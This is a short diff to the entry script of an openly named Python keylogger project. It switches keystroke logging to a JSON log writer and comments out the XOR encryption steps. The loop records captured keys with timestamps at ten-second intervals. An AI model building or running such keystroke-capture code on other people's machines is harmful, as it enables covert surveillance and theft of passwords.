@@ -6,11 +6,13 @@ from keylogger.encryptors import XorEncryption
 from keylogger.keyloggers import SimpleKeylogger
 from keylogger.logwriters import ConsoleLogWriter
 from keylogger.logwriters import FileLogWriter
+from keylogger.logwriters import JsonLogWriter
 
 if __name__ == '__main__':
     keylogger = SimpleKeylogger()
     # log_writer = ConsoleLogWriter()
-    log_writer = FileLogWriter("logdict_new")
+    # log_writer = FileLogWriter("logdict_new")
+    log_writer = JsonLogWriter("file1")
     encryptor = XorEncryption()
     seconds_to_sleep = 10
 
@@ -24,11 +26,11 @@ if __name__ == '__main__':
             if logs:
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                 log_to_write = {timestamp: logs}
-                encrypted_logs = encryptor.get_encrypted_dict(encryptor.encrypt, log_to_write)
+                # encrypted_logs = encryptor.get_encrypted_dict(encryptor.encrypt, log_to_write)
 
                 log_writer.write_log(log_to_write)
-                log_writer.write_log(encrypted_logs)
-                log_writer.write_log(encryptor.get_encrypted_dict(encryptor.decrypt, encrypted_logs))
+                # log_writer.write_log(encrypted_logs)
+                # log_writer.write_log(encryptor.get_encrypted_dict(encryptor.decrypt, encrypted_logs))
     except KeyboardInterrupt:
         keylogger.stop()
         print("Keylogger stopped.")
